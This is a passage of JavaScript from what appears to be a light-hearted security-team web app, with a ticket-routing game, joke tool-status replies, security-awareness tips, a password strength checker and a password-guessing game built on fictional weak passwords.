    return `<article class="ticket ch-${t.ch}"><div class="tk-head">${avatar(p.a,44)}<div><b>${esc(p.n)}</b> <span class="muted">${esc(p.t)}</span><p class="muted small">${CH_LABEL[t.ch]}</p></div></div>
      <p class="tk-msg">${esc(t.m)}</p><div class="routes">${ROUTES.map(([id,l])=>`<button class="btn sm route-${id}" data-tk="${k}" data-r="${id}">${l}</button>`).join("")}</div></article>`; }).join("")
    :`<div class="empty">${avatar(CAST.dave.a,56)}<p>Queue's empty. Enjoy it. Someone is already walking over.</p><button class="btn" id="deskMore">Let the next one in</button></div>`;
  const more=$("#deskMore"); if(more) more.onclick=()=>addTicket(false); }
$("#deskQueue").onclick=e=>{ const b=e.target.closest("[data-r]"); if(!b) return; const k=+b.dataset.tk, ti=desk.q[k]; if(ti===undefined) return; const t=TICKETS[ti], r=b.dataset.r, ok=r===t.a;
  desk.q.splice(k,1); desk.seen.push(ti);
  if(ok){ desk.right++; if(r==="it"||r==="net") desk.bounced++; desk.mood=clamp(desk.mood+6); bump("desk"); earn(3,"",true); sfx(r==="it"||r==="net"?"whoosh":"chime");
    desk.last=r==="it"||r==="net"?`Bounced ${CAST[t.f].n}'s ${CH_LABEL[t.ch]}. Clean.`:`Handled ${CAST[t.f].n}'s ${CH_LABEL[t.ch]}.`;
    deskToast(`Right call. ${t.w}`); }
  else { desk.wrong++; desk.mood=clamp(desk.mood-14); desk.last=WRONG[r]; sfx("thud");
    if(desk.mood<50){ setTimeout(()=>{ sfx2("boss"); },250); deskToast(`${WRONG[r]} The CISO, through the wall: "${pick(CISO_LINES,Date.now())}" Correct answer: ${ROUTES.find(x=>x[0]===t.a)[1]}. ${t.w}`); }
    else deskToast(`${WRONG[r]} Correct answer: ${ROUTES.find(x=>x[0]===t.a)[1]}. ${t.w}`); }
  deskSave(); renderDesk(); renderGame(); };
function deskToast(msg){ const el=$("#deskNote"); if(!el) return; el.innerHTML=esc(msg); el.classList.remove("show"); void el.offsetWidth; el.classList.add("show"); }
$("#coffeeBtn").onclick=()=>{ const until=fin(store.get("coffeeAt",0)); if(Date.now()<until){ toast(`The machine is still recovering. Try again in ${Math.ceil((until-Date.now())/60000)} min.`); return; }
  store.set("coffeeAt",Date.now()+15*60000); sfx2("coffee"); petGain(4,20); desk.mood=clamp(desk.mood+3); deskSave(); renderDesk(); deskToast("Coffee made. Energy restored. The CISO smelled it and calmed down a little."); };

/* ---------- tool status board and the swear jar ---------- */
var TOOLS=[
 {id:"mde",n:"Defender for Endpoint",s:["Operational","Portal loading. Still.","Device timeline taking a scenic route","Agent check-in delayed"],x:["Have you tried waiting for the portal to finish loading?","That device is onboarded. Spiritually.","Advanced hunting says 0 results. Have you tried a different table?","Your alert was merged into an incident about something else entirely."]},
 {id:"secops",n:"Google SecOps",s:["Operational","Ingestion lag 42 minutes","Parser having a moment","UDM field went on holiday"],x:["Your query is valid. In a different UDM field.","That log arrived. It's parsed as GENERIC_EVENT now.","Detection ran successfully on zero events.","Have you read the YARA-L docs? All of them?"]},
 {id:"pan",n:"Palo Alto firewall",s:["Operational","Commit in progress since lunch","Rule 4,017 of 4,018 matched","Threat logs very quiet. Suspiciously."],x:["It's not the firewall. Priya told me to say that.","Your change is committed. Pending the other commit. Pending the other other commit.","The traffic was allowed by a rule called 'temp-any-any-2019'.","Have you checked the URL category? It's 'Unknown'. Like your weekend plans."]},
 {id:"splunk",n:"Splunk",s:["Operational","Search queued behind 14 others","Licence warning (it's fine)","Indexer catching its breath"],x:["Your search has been queued behind 14 others. Most of them are yours.","Results truncated at 10,000. The interesting one was 10,001.","Have you tried adding 'index=*'? Please don't.","Field extracted successfully as 'field1'."]},
 {id:"snow",n:"ServiceNow",s:["Operational","Form has 47 mandatory fields","Assignment group: ???","Slow, but in an official way"],x:["Your yell has been logged as INC0042069 and assigned to the wrong group.","Please select a category. 'Rage' is not a valid category.","This ticket has been auto-closed due to inactivity. Yours.","Thank you for your feedback. A survey is on its way."]},
 {id:"okta",n:"Okta",s:["Operational","Push notification lag","Session timeouts feeling generous","SSO tile playing hide and seek"],x:["Please approve this push to continue yelling.","Your session expired while you were typing that.","That user has 14 MFA factors and remembers none of them.","Sign-in risk: high. Reason: you sound angry."]}];
var toolState={};
function rollTools(){ TOOLS.forEach(t=>{ toolState[t.id]=Math.random()<.55?0:1+Math.floor(Math.random()*(t.s.length-1)); }); }
rollTools(); setInterval(()=>{ if(!document.hidden){ rollTools(); renderTools(); } },240000);
var swear=(o=>({n:Math.floor(clamp(fin(o&&o.n),0,1e6)),donated:Math.floor(clamp(fin(o&&o.donated),0,1e6))}))(store.get("swear",{}));
function renderTools(){ if(!$("#tools")) return;
  $("#tools").innerHTML=TOOLS.map(t=>{ const s=toolState[t.id]; return `<div class="tool ${s?"degraded":""}"><span class="tdot"></span><div><b>${esc(t.n)}</b><p class="muted small">${esc(t.s[s])}</p></div><button class="btn sm ghost" data-yell="${t.id}">Yell at it</button></div>`; }).join("");
  const jar=Math.min(1,swear.n%25/25+(swear.n&&swear.n%25===0?1:0));
  $("#jar").innerHTML=`<svg viewBox="0 0 60 70" class="jarsvg" aria-hidden="true"><rect x="14" y="4" width="32" height="7" rx="2" fill="#8D93A8"/><path d="M12 12h36v48a6 6 0 0 1-6 6H18a6 6 0 0 1-6-6z" fill="#ffffff10" stroke="#9CA2B6" stroke-width="2"/>
    <rect x="14" y="${64-46*jar}" width="32" height="${46*jar}" rx="3" fill="var(--sodium)" opacity=".8"/></svg><div><p><b>${swear.n}</b> outbursts this year. ${swear.donated?`${swear.donated} donated to the team pizza fund.`:""}</p>
    <p class="muted small">Every yell costs nothing but your dignity. Every 25 fills the jar for team pizza.</p>${swear.n>=25&&swear.n-swear.donated*25>=25?'<button class="btn sm" id="pizza">Empty the jar into the pizza fund</button>':""}</div>`;
  const pz=$("#pizza"); if(pz) pz.onclick=()=>{ swear.donated++; store.set("swear",swear); earn(20,"team pizza fund"); sfx("coin"); renderTools(); }; }
$("#tools").onclick=e=>{ const b=e.target.closest("[data-yell]"); if(!b) return; const t=TOOLS.find(x=>x.id===b.dataset.yell);
  swear.n++; store.set("swear",swear); sfx2("bleep"); const reply=pick(t.x,swear.n+Math.floor(Math.random()*9));
  $("#toolReply").innerHTML=`<p class="grawlix">${pick(["#$%&!","@!#?@!","%&#@*!","$#!%&?"],swear.n)}</p><p><b>${esc(t.n)} replies:</b> ${esc(reply)}</p>`;
  $("#toolReply").classList.remove("show"); void $("#toolReply").offsetWidth; $("#toolReply").classList.add("show"); renderTools(); renderDesk(); renderGame(); };

/* ---------- the PEBKAC wall: real user habits, real lessons ---------- */
var PEBKAC=[
 ["The sticky note","Password on a sticky note on the monitor, 'for emergencies'.","Password managers exist so nobody has to choose between remembering and writing it down."],
 ["invoice.pdf.exe","Double-clicked 'invoice.pdf.exe' because the icon looked like a PDF.","Turn on file extensions. Icons lie, extensions mostly don't."],
 ["The helpful reply","Replied to a phishing email with their username and password, 'to confirm it was fake'.","Report it, never reply to it. Phishers love confirmation."],
 ["Screen share surprise","Shared their screen on a 200-person call with the password manager open.","Share a window, not the whole desktop."],
 ["The car-park USB","Plugged in a USB stick found in the car park to find the owner.","Found USB sticks go to the SOC, not into a laptop."],
 ["Password, but secure","'My password is Password1, but with a capital P, for security.'","Length beats complexity. Four random words beat P@ssw0rd."],
 ["MFA, approved","Approved 14 MFA pushes at 2 AM 'to make the phone stop buzzing'.","If you didn't just log in, deny the push and tell the SOC."],
 ["The shared account","The whole team logs into one account called 'finance_shared'.","Shared accounts mean nobody is accountable, especially during an incident."],
 ["Just this once","Disabled the antivirus 'just for this one installer' from a forum.","If the installer needs antivirus off, the installer is the problem."],
 ["The public Wi-Fi","Logged into the payroll system from airport Wi-Fi called 'Free_Airport_WiFi_Real'.","Use the VPN. And maybe don't trust networks with 'Real' in the name."]];
var pebI=Math.floor(Math.random()*PEBKAC.length);
function renderPebkac(){ if(!$("#pebkac")) return; const p=PEBKAC[pebI%PEBKAC.length];
  $("#pebkac").innerHTML=`<p class="peb-t">${esc(p[0])}</p><p>${esc(p[1])}</p><p class="peb-l">${esc(p[2])}</p>`; }
$("#pebNext").onclick=()=>{ pebI++; renderPebkac(); sfx("tick"); };

/* ---------- password lab: strength checker ---------- */
var COMMON_PW=["password","123456","12345678","123456789","qwerty","abc123","111111","letmein","welcome","admin","iloveyou","monkey","dragon","football","baseball","sunshine","princess","master","shadow","superman","michael","trustno1","passw0rd","p@ssw0rd","p@ssword","password1","qwerty123","1q2w3e4r","zaq12wsx","starwars","hello","freedom","whatever","login","changeme","secret","summer","winter","spring","autumn","company","contoso","liverpool","chelsea","arsenal","pokemon","batman","cheese","computer","internet","myspace","solarwinds123"];
var WALKS=["qwerty","asdf","zxcv","1qaz","2wsx","qazwsx","12345","23456","34567","09876","abcdef","poiuy","lkjhg"];
function leet(s){ return s.toLowerCase().replace(/[@4]/g,"a").replace(/3/g,"e").replace(/[1!|]/g,"i").replace(/0/g,"o").replace(/[$5]/g,"s").replace(/7/g,"t"); }
function analysePw(pw){ const out={found:[],bits:0}; if(!pw) return out;
  let pool=0; if(/[a-z]/.test(pw)) pool+=26; if(/[A-Z]/.test(pw)) pool+=26; if(/[0-9]/.test(pw)) pool+=10; if(/[^A-Za-z0-9]/.test(pw)) pool+=33;
  let bits=pw.length*Math.log2(Math.max(pool,1)); const low=pw.toLowerCase(), base=leet(pw).replace(/[^a-z]/g,"");
  if(COMMON_PW.includes(low)||COMMON_PW.includes(leet(pw))){ out.found.push("It's on every common-password list. Attackers try it first."); bits=Math.min(bits,6); }
  else if(COMMON_PW.some(w=>w.length>=5&&base.includes(leet(w).replace(/[^a-z]/g,"")))){ out.found.push("Built around a common word. Symbol swaps like @ for a don't fool cracking tools."); bits=Math.min(bits,22); }
  if(WALKS.some(w=>low.includes(w))){ out.found.push("Contains a keyboard pattern."); bits-=12; }
  if(/(19|20)\d{2}/.test(pw)){ out.found.push("Contains a year. Attackers append years automatically."); bits-=8; }
  if(/(summer|winter|spring|autumn|fall)/i.test(pw)){ out.found.push("Season plus year is a password-spraying classic."); bits=Math.min(bits,18); }
  if(/(.)\1\1/.test(pw)){ out.found.push("Repeated characters add almost nothing."); bits-=6; }
  if(/^[A-Z][a-z]+\d+[!@#$%^&*]?$/.test(pw)){ out.found.push("Capital, word, digits, symbol: the exact shape every policy produces and every cracker expects."); bits=Math.min(bits,26); }
  if(pw.length<10) out.found.push("Short. Length matters more than anything else.");
  if(pw.split(/[\s\-_.]+/).filter(w=>w.length>=3).length>=4&&pw.length>=20) out.found.push("Looks like a passphrase. Nice.");
  out.bits=Math.max(0,bits); return out; }
function fmtTime(sec){ if(sec<1) return "instantly"; const u=[["second",60],["minute",60],["hour",24],["day",365],["year",100],["century",1e4]]; let v=sec,i=0; while(i<u.length&&v>=u[i][1]){ v/=u[i][1]; i++; }
  if(i>=u.length) return "longer than the universe will exist"; const n=Math.floor(v); return `${n} ${u[i][0]}${n===1?"":i===5?"":"s"}`.replace("centurys","centuries"); }
var PW_VERDICTS=[[0,"Kevin-grade","Instantly guessed. Please never use this."],[28,"Sticky-note tier","A laptop cracks this before your coffee cools."],[45,"Meh","Fine against a login page, weak against a stolen hash."],[60,"Solid","Strong enough for most things, especially with MFA."],[80,"Fortress","Attackers will phish you instead. Stay alert."]];
function renderPwCheck(){ const pw=$("#pwIn").value, a=analysePw(pw), box=$("#pwOut");
  if(!pw){ box.innerHTML='<p class="muted">Type something to see how long it would survive.</p>'; $("#pwMeter").style.width="0"; return; }
  const v=[...PW_VERDICTS].reverse().find(x=>a.bits>=x[0])||PW_VERDICTS[0], g=Math.pow(2,a.bits)/2;
  $("#pwMeter").style.width=Math.min(100,a.bits/90*100)+"%"; $("#pwMeter").className="pw-"+PW_VERDICTS.indexOf(v);
  box.innerHTML=`<p class="pw-verdict">${esc(v[1])}</p><p>${esc(v[2])}</p>
    <div class="pw-times"><div><b>${fmtTime(g/10)}</b><span>Guessing at a login page, 10 a second</span></div><div><b>${fmtTime(g/1e4)}</b><span>Stolen hash, slow algorithm like bcrypt</span></div><div><b>${fmtTime(g/1e10)}</b><span>Stolen hash, fast algorithm, one GPU rig</span></div></div>
    ${a.found.length?`<ul class="tight">${a.found.map(f=>`<li>${esc(f)}</li>`).join("")}</ul>`:""}`;
  if(v===PW_VERDICTS[4]) store.set("pwStrong",true); }
$("#pwIn").oninput=()=>{ renderPwCheck(); sfx2("key"); };
$("#pwShow").onclick=()=>{ const i=$("#pwIn"); i.type=i.type==="password"?"text":"password"; $("#pwShow").textContent=i.type==="password"?"Show":"Hide"; };
var PP_WORDS=["anchor","biscuit","cactus","dolphin","ember","falcon","glacier","harbor","igloo","jigsaw","kettle","lantern","marble","nugget","orbit","pepper","quartz","rocket","saddle","teapot","umbrella","velvet","walnut","yodel","zipper","acorn","banjo","comet","donut","fossil","gravy","hammock","island","jelly","koala","lemon","mango","noodle","otter","pickle","radar","sprout","tunnel","violin","waffle","yonder","zebra","basil","canyon","domino"];
$("#ppGen").onclick=()=>{ const a=new Uint32Array(4); crypto.getRandomValues(a); const p=Array.from(a,x=>PP_WORDS[x%PP_WORDS.length]).join("-"); $("#ppOut").textContent=p; sfx("pop"); };

/* ---------- password lab: crack the colleague (daily) ---------- */
var CRACK=[
 {who:"kevin",pw:"mittens2019!",c:["Posts about his cat Mittens every day","Adopted Mittens in 2019","Policy says 'end with a symbol', so he does"],l:"Pet name plus year plus symbol. Social media gave it all away."},
 {who:"helen",pw:"summer2026!",c:["Loves summer, says so in every email signature","Changed her password this year","Policy: capital letter and a symbol at the end"],l:"Season plus year is the most sprayed password pattern on the internet."},
 {who:"dan",pw:"qwerty12345",c:["Uses the same password everywhere","Likes keyboard patterns because they're 'easy to type'","Exactly 11 characters"],l:"Keyboard walks are in every cracking wordlist. Reuse made it worse."},
 {who:"marco",pw:"liverpool1",c:["Never misses a Liverpool match","Policy needed a number","He chose the smallest one"],l:"Favourite team plus 1. Attackers love sports fans."},
 {who:"sam",pw:"password1",c:["Started this month and was in a hurry","Rules: 8+ characters and a number","Picked the first thing that passed the policy"],l:"Policies that only check character types produce Password1. Length rules and blocklists fix it."},
 {who:"ciso",pw:"b1scu1t1975",c:["His dog is called Biscuit","Born in 1975","Believes swapping letters for numbers is 'military grade'"],l:"Leetspeak swaps are applied automatically by cracking rules. They add almost nothing."},
 {who:"dave",pw:"contoso2026!",c:["Sets every new starter's password himself","The company is called Contoso","Format: company name, current year, exclamation mark"],l:"Predictable default passwords mean every new account starts compromised. Force a change at first login."},
 {who:"priya",pw:"admin",c:["It's for the old switch in the comms cupboard","Nobody has changed it since it was installed","The username is also admin"],l:"Default credentials on network gear are an attacker's favourite door. Change them on day one."}];
function crackToday(){ return CRACK[(dayNum()*5+2)%CRACK.length]; }
function renderCrack(){ if(!$("#crack")) return; const c=crackToday(), p=CAST[c.who], st=store.get("crk_"+todayKey(),{tries:0,done:false,won:false})||{tries:0,done:false,won:false};
  const shown=Math.min(c.c.length,1+st.tries);
  $("#crack").innerHTML=`<div class="crack-who">${avatar(p.a,64)}<div><b>${esc(p.n)}, ${esc(p.t)}</b><p class="muted small">${esc(p.q)}</p></div></div>
    <ol class="clues">${c.c.slice(0,st.done?c.c.length:shown).map(x=>`<li>${esc(x)}</li>`).join("")}</ol>
    ${st.done?`<p class="${st.won?"ok-line":"warn"}">${st.won?ic("check")+" Cracked: ":"The password was "}<b class="mono">${esc(c.pw)}</b>. ${esc(c.l)}</p>`:
      `<div class="row"><input class="search grow" id="crkIn" placeholder="Your guess (not case-sensitive)" autocomplete="off" aria-label="Your guess"><button class="btn primary" id="crkGo">Try it</button></div>
       <p class="muted small">${6-st.tries} tries left. Each wrong guess reveals another clue. All fictional, all too realistic.</p>`}`;
  const go=()=>{ const v=($("#crkIn").value||"").trim().toLowerCase(); if(!v) return; const s=store.get("crk_"+todayKey(),{tries:0,done:false,won:false})||{tries:0,done:false,won:false};
    if(v===c.pw){ s.done=true; s.won=true; store.set("crackWins",fin(store.get("crackWins",0))+1); earn(15,"password cracked"); sfx("chime"); }
    else { s.tries++; sfx2("bleep"); if(s.tries>=6){ s.done=true; sfx("thud"); } }
    store.set("crk_"+todayKey(),s); renderCrack(); renderGame(); };
  if($("#crkGo")){ $("#crkGo").onclick=go; $("#crkIn").onkeydown=e=>{ if(e.key==="Enter") go(); }; } }

/* ---------- quests, xp and badges for the new world ---------- */
function quests(){ return [
  ["Read today's morning brew", store.get("brewSeen","")===todayKey(), "#brew"],
  ["Route three tickets at the desk", typeof desk!=="undefined"&&!!desk&&desk.right>=3, "#desk"],
  ["Mood check-in", todayMood()!==null, "#lounge"],
  ["Take one real break", store.get("brk_"+todayKey(),0)>0, "#breakroom"],
  ["Play SOCdle or crack today's password", !!(store.get("dle_"+todayKey(),{}).done)||!!(store.get("crk_"+todayKey(),{})||{}).done, "#pwlab"]]; }
function xp(){ const st=store.get("dleStats",{won:0}); return stats.pop+stats.smash+stats.breath*10+stats.phish*5+stats.ffok*5+stats.card*3+fin(stats.arcade)*15+stats.brew*10+(st.won||0)*20+Object.keys(moods()).length*5+fin(stats.desk)*8+fin(store.get("crackWins",0))*20; }
if(!Number.isFinite(stats.desk)) stats.desk=0;
BADGES.push(["check","Ticket ninja","Route 25 tickets correctly",()=>stats.desk>=25],["refresh","Bounce master","Bounce 10 tickets to the right team",()=>Object.keys(allData()).some(k=>/^fpc_desk_/.test(k)&&fin((store.get(k.slice(4),{})||{}).bounced)>=10)],
  ["siren","Potty mouth","Put 25 outbursts in the swear jar",()=>swear.n>=25],["key","Password cracker","Crack 5 colleagues' passwords",()=>fin(store.get("crackWins",0))>=5],["lock","Passphrase person","Check a password rated Fortress",()=>!!store.get("pwStrong",false)]);

function v8Init(){ renderDesk(); renderTools(); renderPebkac(); renderPwCheck(); renderCrack(); if(!desk.q.length){ addTicket(true); addTicket(true); }
  window.addEventListener("hashchange",()=>{ const h=location.hash; if(h==="#desk"){ renderDesk(); renderTools(); } if(h==="#pwlab") renderCrack(); if(h==="#fame") location.hash="#menu"; }); }

/* ---------------- init ---------------- */
resize(); requestAnimationFrame(loop);
patchSays(); renderHoro(); renderBrew(); renderDet(); renderMenu(); renderHof(); renderEv(); showCard();
renderBoard(); fillWrap(); showFF(); renderShift(); renderCk(); renderNudges(); tick(); route();
{ const h=new Date().getHours(); if((h>=22||h<6)&&!stats.night) bump("night"); }
applyProfile(); renderMood(); renderGame();
setInterval(()=>{ applyHat(); renderGame(); },60000);
if(!prof) setTimeout(openOnb,600);
redesignInit();
v7Init();
v8Init();
